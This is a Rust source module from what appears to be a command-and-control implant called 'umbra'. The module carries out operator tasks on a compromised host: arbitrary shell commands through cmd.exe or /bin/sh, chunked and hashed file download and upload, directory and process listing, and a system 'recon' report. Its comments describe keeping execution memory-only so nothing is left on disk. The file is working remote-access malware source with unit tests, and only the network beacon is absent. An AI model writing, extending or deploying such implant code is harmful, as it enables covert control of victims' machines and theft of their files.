//! Task execution.
//!
//! All command execution is memory-only from the implant's point of view: the
//! command is handed to the platform shell through a pipe, its output is read
//! back into the process, and nothing is staged on disk (no temp scripts, no
//! dropped binaries). File transfer tasks only touch paths the operator names.

use std::io::Read;
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, Instant};

use crate::sysinfo;
use crate::upk::{self, Value};

pub const MAX_OUTPUT: usize = 900 * 1024; // stay below the 1 MiB frame limit

pub struct Outcome {
    pub code: i64,
    pub out: Vec<u8>,
    pub err: String,
    /// Extra result fields (`total`, `eof`, `sha256`, ...). They are merged into
    /// the RESULT body, so the server and the operator can see transfer metadata
    /// without changing the message shape.
    pub extra: Vec<(&'static str, Value)>,
}

impl Outcome {
    pub fn ok(out: Vec<u8>) -> Self {
        Outcome { code: 0, out, err: String::new(), extra: Vec::new() }
    }
    pub fn err(code: i64, msg: impl Into<String>) -> Self {
        Outcome { code, out: Vec::new(), err: msg.into(), extra: Vec::new() }
    }
    /// Attach a metadata field to the result.
    pub fn with(mut self, key: &'static str, value: Value) -> Self {
        self.extra.push((key, value));
        self
    }
    pub fn to_value(&self, task_id: &str) -> Value {
        let mut fields = vec![
            ("id", upk::s(task_id)),
            ("code", upk::i(self.code)),
            ("out", upk::bin(&self.out)),
            ("err", upk::s(&self.err)),
        ];
        for (k, v) in &self.extra {
            fields.push((*k, v.clone()));
        }
        upk::map(fields)
    }
}

fn shell_command(cmd: &str) -> Command {
    #[cfg(windows)]
    {
        let mut c = Command::new("cmd.exe");
        c.arg("/C").arg(cmd);
        c
    }
    #[cfg(not(windows))]
    {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(cmd);
        c
    }
}

/// Read a pipe to EOF but keep at most `MAX_OUTPUT` (+ a small slack) bytes.
///
/// Reading to EOF is not optional: a child that writes more than the pipe
/// buffer (~64 KiB) blocks inside `write()` and would never exit, so "wait for
/// exit, then read" deadlocks on exactly the commands operators care about
/// (`ps aux`, `ls -R`, `dmesg`).
fn drain<R: Read>(mut pipe: R) -> Vec<u8> {
    let mut kept = Vec::new();
    let mut chunk = [0u8; 8192];
    loop {
        match pipe.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                let room = (MAX_OUTPUT + 4096).saturating_sub(kept.len());
                if room > 0 {
                    kept.extend_from_slice(&chunk[..n.min(room)]);
                }
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(_) => break,
        }
    }
    kept
}

fn truncate(mut v: Vec<u8>) -> Vec<u8> {
    if v.len() > MAX_OUTPUT {
        v.truncate(MAX_OUTPUT);
        v.extend_from_slice(b"\n[umbra: output truncated]\n");
    }
    v
}

/// Run a shell command with a hard timeout, capturing stdout+stderr.
///
/// Both pipes are drained by their own thread while the child runs; the main
/// thread only waits. Collecting the output afterwards is bounded, because a
/// background grandchild can keep a pipe open long after the child we spawned
/// has exited.
pub fn shell(cmd: &str, timeout_secs: u64) -> Outcome {
    if cmd.trim().is_empty() {
        return Outcome::err(1, "empty command");
    }
    let mut child = match shell_command(cmd)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => return Outcome::err(127, format!("spawn failed: {e}")),
    };

    let (tx, rx) = mpsc::channel::<(usize, Vec<u8>)>();
    if let Some(out) = child.stdout.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((0, drain(out)));
        });
    }
    if let Some(err) = child.stderr.take() {
        let tx = tx.clone();
        thread::spawn(move || {
            let _ = tx.send((1, drain(err)));
        });
    }
    drop(tx);

    let limit = timeout_secs.max(1);
    let deadline = Instant::now() + Duration::from_secs(limit);
    let timed_out = loop {
        match child.try_wait() {
            Ok(Some(_)) => break false,
            Ok(None) => {
                if Instant::now() > deadline {
                    let _ = child.kill();
                    let _ = child.wait();
                    break true;
                }
                thread::sleep(Duration::from_millis(20));
            }
            Err(e) => {
                let _ = child.kill();
                return Outcome::err(1, format!("wait failed: {e}"));
            }
        }
    };

    let collect_for = if timed_out { 200 } else { 2000 };
    let collect_until = Instant::now() + Duration::from_millis(collect_for);
    let mut parts: [Option<Vec<u8>>; 2] = [None, None];
    for _ in 0..2 {
        let left = collect_until.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break;
        }
        match rx.recv_timeout(left) {
            Ok((which, buf)) => parts[which] = Some(buf),
            Err(_) => break,
        }
    }
    let mut out = parts[0].take().unwrap_or_default();
    if let Some(err) = parts[1].take() {
        out.extend_from_slice(&err);
    }

    if timed_out {
        // Partial output is still evidence: return what the command produced
        // before it was killed instead of throwing it away.
        return Outcome {
            code: 124,
            out: truncate(out),
            err: format!("command timed out after {limit}s"),
            extra: Vec::new(),
        };
    }

    let code = child.wait().ok().and_then(|s| s.code()).map(|c| c as i64).unwrap_or(0);
    Outcome { code, out: truncate(out), err: String::new(), extra: Vec::new() }
}

/// Read one chunk of a file.
///
/// A whole file rarely fits in a frame (1 MiB body, 900 KiB output budget), so
/// transfers are chunked: the caller asks for a byte range and gets it back with
/// `total`, `offset`, `eof` and a SHA-256 of *this chunk* in the result, which is
/// what makes a multi-request transfer verifiable instead of hopeful.
pub fn download(path: &str, offset: u64, limit: u64) -> Outcome {
    if path.is_empty() {
        return Outcome::err(1, "download requires args.path");
    }
    let limit = limit.clamp(1, MAX_OUTPUT as u64) as usize;
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
    };
    if meta.is_dir() {
        return Outcome::err(1, format!("download {path}: is a directory"));
    }
    let total = meta.len();
    if offset > total {
        return Outcome::err(1, format!("download {path}: offset {offset} past end ({total})"));
    }
    let mut file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
    };
    if offset > 0 {
        use std::io::Seek;
        if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)) {
            return Outcome::err(1, format!("download {path}: seek: {e}"));
        }
    }
    let mut buf = vec![0u8; limit];
    let mut read = 0usize;
    while read < buf.len() {
        match file.read(&mut buf[read..]) {
            Ok(0) => break,
            Ok(n) => read += n,
            Err(ref e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Outcome::err(1, format!("download {path}: {e}")),
        }
    }
    buf.truncate(read);
    let digest = crate::crypto::sha256(&buf);
    let eof = offset.saturating_add(read as u64) >= total;
    Outcome::ok(buf)
        .with("total", upk::u(total))
        .with("offset", upk::u(offset))
        .with("eof", upk::bool_(eof))
        .with("sha256", upk::s(&crate::config::hex_encode(&digest)))
}

/// Write one chunk of a file at `offset`.
///
/// The first chunk (`offset == 0`) truncates, later chunks are written at their
/// offset, so a retried transfer cannot leave a half-old file behind. On the
/// final chunk the result carries the SHA-256 of the whole file, which the
/// caller compares with the local hash.
pub fn upload(path: &str, offset: u64, data: &[u8], eof: bool) -> Outcome {
    if path.is_empty() {
        return Outcome::err(1, "upload requires args.path");
    }
    use std::io::{Seek, Write};
    let mut file = match std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(offset == 0)
        .open(path)
    {
        Ok(f) => f,
        Err(e) => return Outcome::err(1, format!("upload {path}: {e}")),
    };
    if offset > 0 {
        if let Err(e) = file.seek(std::io::SeekFrom::Start(offset)) {
            return Outcome::err(1, format!("upload {path}: seek: {e}"));
        }
    }
    if let Err(e) = file.write_all(data) {
        return Outcome::err(1, format!("upload {path}: {e}"));
    }
    if let Err(e) = file.flush() {
        return Outcome::err(1, format!("upload {path}: flush: {e}"));
    }
    drop(file);

    let written = offset.saturating_add(data.len() as u64);
    let mut outcome = Outcome::ok(
        format!("wrote {} bytes at offset {offset} to {path}\n", data.len()).into_bytes(),
    )
    .with("written", upk::u(written))
    .with("eof", upk::bool_(eof));
    if eof {
        match std::fs::read(path) {
            Ok(whole) => {
                let digest = crate::crypto::sha256(&whole);
                outcome = outcome
                    .with("total", upk::u(whole.len() as u64))
                    .with("sha256", upk::s(&crate::config::hex_encode(&digest)));
            }
            Err(e) => return Outcome::err(1, format!("upload {path}: verify: {e}")),
        }
    }
    outcome
}

/// Execute one task. `sleep`/`exit` are handled by the beacon loop itself, so
/// they are only reported here for completeness.
pub fn run(kind: &str, args: &Value) -> Outcome {
    match kind {
        "shell" | "exec" => {
            let cmd = args.str_or("cmd", "");
            let timeout = args.u64_or("timeout", 120);
            shell(&cmd, timeout)
        }
        "sysinfo" | "recon" => Outcome::ok(sysinfo::report().into_bytes()),
        "pwd" | "cwd" => match std::env::current_dir() {
            Ok(p) => Outcome::ok(format!("{}\n", p.display()).into_bytes()),
            Err(e) => Outcome::err(1, format!("cwd: {e}")),
        },
        "ls" => {
            let path = args.str_or("path", ".");
            let mut out = String::new();
            match std::fs::read_dir(&path) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        let meta = entry.metadata().ok();
                        let kind = match meta {
                            Some(m) if m.is_dir() => "d",
                            _ => "-",
                        };
                        let size = meta.map(|m| m.len()).unwrap_or(0);
                        out.push_str(&format!(
                            "{kind} {:>12} {}\n",
                            size,
                            entry.path().display()
                        ));
                    }
                    Outcome::ok(out.into_bytes())
                }
                Err(e) => Outcome::err(1, format!("ls {path}: {e}")),
            }
        }
        "download" | "cat" => {
            let path = args.str_or("path", "");
            let offset = args.u64_or("offset", 0);
            let limit = args.u64_or("limit", MAX_OUTPUT as u64);
            download(&path, offset, limit)
        }
        "upload" => {
            let path = args.str_or("path", "");
            let data = args.bin_or("data", b"");
            let offset = args.u64_or("offset", 0);
            let eof = args.bool_or("eof", true);
            upload(&path, offset, &data, eof)
        }
        "ps" => {
            // Portable enough for a PoC: ask the platform for the process list.
            #[cfg(windows)]
            let cmd = "tasklist";
            #[cfg(target_os = "linux")]
            let cmd = "ps -eo pid,ppid,user,comm --sort=pid";
            #[cfg(target_os = "macos")]
            let cmd = "ps -eo pid,ppid,user,comm";
            #[cfg(not(any(windows, target_os = "linux", target_os = "macos")))]
            let cmd = "ps";
            shell(cmd, 30)
        }
        "sleep" => Outcome::ok(b"sleep interval updated\n".to_vec()),
        "exit" | "kill" => Outcome::ok(b"beacon exiting\n".to_vec()),
        "ping" => Outcome::ok(b"pong\n".to_vec()),
        other => Outcome::err(2, format!("unknown task kind {other:?}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_captures_output() {
        let outcome = shell("echo umbra", 10);
        assert_eq!(outcome.code, 0);
        assert!(String::from_utf8_lossy(&outcome.out).contains("umbra"));
    }

    #[cfg(unix)]
    #[test]
    fn shell_does_not_deadlock_on_large_output() {
        // 512 KiB is eight pipe buffers: with "wait, then read" this hangs
        // until the timeout and comes back empty.
        let outcome = shell("head -c 524288 /dev/zero", 10);
        assert_eq!(outcome.code, 0);
        assert!(!outcome.out.is_empty(), "no output captured");
        assert!(outcome.err.is_empty());
    }

    #[test]
    fn drain_keeps_a_bounded_prefix() {
        let kept = drain(std::io::Cursor::new(vec![b'x'; MAX_OUTPUT + 10_000]));
        assert_eq!(kept.len(), MAX_OUTPUT + 4096);
        assert!(kept.iter().all(|b| *b == b'x'));
    }

    fn temp_path(tag: &str) -> std::path::PathBuf {
        // No tempfile dependency: the pid + a counter is unique enough here.
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let n = N.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!("umbra-test-{}-{tag}-{n}", std::process::id()))
    }

    #[test]
    fn download_is_chunked_and_hashed() {
        let path = temp_path("dl");
        std::fs::write(&path, b"0123456789").unwrap();
        let first = download(path.to_str().unwrap(), 0, 4);
        assert_eq!(first.code, 0);
        assert_eq!(&first.out[..], b"0123");
        let eof = |o: &Outcome, key: &str| o.extra.iter().find(|(k, _)| *k == key).map(|(_, v)| v.clone()).unwrap();
        assert!(matches!(eof(&first, "eof"), Value::Bool(false)));
        assert!(matches!(eof(&first, "total"), Value::Uint(10)));

        let last = download(path.to_str().unwrap(), 8, 4);
        assert_eq!(last.code, 0);
        assert_eq!(&last.out[..], b"89");
        assert!(matches!(eof(&last, "eof"), Value::Bool(true)));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn download_rejects_bad_ranges() {
        let path = temp_path("dl-bad");
        std::fs::write(&path, b"abc").unwrap();
        let past = download(path.to_str().unwrap(), 99, 4);
        assert_eq!(past.code, 1);
        assert!(past.err.contains("past end"));
        let dir = std::env::temp_dir();
        let is_dir = download(dir.to_str().unwrap(), 0, 4);
        assert_eq!(is_dir.code, 1);
        let missing = download("/nonexistent/umbra/file", 0, 4);
        assert_eq!(missing.code, 1);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn upload_rewrites_from_zero_and_verifies() {
        let path = temp_path("up");
        std::fs::write(&path, b"aaaaaaaaaa").unwrap();
        let short = upload(path.to_str().unwrap(), 0, b"bb", true);
        assert_eq!(short.code, 0);
        assert_eq!(&std::fs::read(&path).unwrap()[..], b"bb");
        // The final chunk reports the whole-file hash, not just the chunk's.
        let digest = short
            .extra
            .iter()
            .find(|(k, _)| *k == "sha256")
            .map(|(_, v)| v.clone())
            .unwrap();
        assert!(matches!(digest, Value::Str(ref s) if s == &crate::config::hex_encode(&crate::crypto::sha256(b"bb"))));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn unknown_kind_is_reported() {
        let outcome = run("nope", &upk::map(vec![]));
        assert_eq!(outcome.code, 2);
        assert!(outcome.err.contains("unknown task kind"));
    }
}
